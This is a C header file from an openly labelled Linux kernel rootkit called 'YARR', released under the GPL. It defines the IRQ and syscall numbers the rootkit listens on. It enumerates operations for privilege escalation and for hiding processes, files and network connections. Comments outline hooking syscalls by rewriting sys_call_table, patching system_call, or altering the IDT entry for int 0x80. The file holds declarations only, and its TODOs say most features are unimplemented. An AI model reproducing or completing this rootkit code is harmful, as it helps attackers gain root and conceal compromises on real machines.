/*
 *  YARR - Yet Another Repetitive Rootkit
 *  Copyright (C) 2011 Ole 
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 1, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

#ifndef __YARR_WE_NEED_SOME_STRUCTS
#define __YARR_WE_NEED_SOME_STRUCTS

#include <linux/types.h>

// TODO: Don't hardcode the IRQ taken, detect a free IRQ at init-time and use
// it. If this IRQ is already taken we will override it and could let the
// system really unstable... Why IRQ 101? Because it's seems like "LOL!".
/* Interrupt where yarr listen. */
#define YARR_IRQ (101)

// TODO: As usual, don't hardcode this.
/* Syscall vector where yarr listen. */
#define YARR_SYSCALL (223)

/* The IRQ vector of Linux system_call. */
#define LINUX_SYSCALL_VECTOR (0x80)

// TODO: Implement them would be nice xD.
/* Operations that we will ask yarr. */
typedef enum {
	GIVE_PRIVILEGES,
	HIDE_PROCESS,
	HIDE_FILE,
	HIDE_CONNECTION
} yarrOps;

// TODO: This will need more fields when we implement more functionality.
/*
 * This type is used on yarrSyscall (syscall.h/c), it represents the data that
 * it needs to accomplish its work.
 */
typedef union {
	pid_t pid;
} syscallData;

// TODO: Implement all the methods.
/*
 * Methods for hooking syscalls.
 *
 * - HOOK_EACH_SYSCALL: Modifies each entry on the sys_call_table and make them
 *   point to our hooks functions.
 *
 * - PATCH_SYSTEM_CALL: Patchs the system_call function code to make it use a
 *   fake sys_call_table.
 *
 * - HOOK_SYSTEM_CALL: Modifies the IDT entry of the IRQ 0x80 (the IRQ used by
 *   system_call but sure you already knew that).
 */
typedef enum {
	HOOK_EACH_SYSCALL,
	PATCH_SYSTEM_CALL,
	HOOK_SYSTEM_CALL
} syscallHookingMethods;

#endif /* __YARR_WE_NEED_SOM_STRUCTS. */
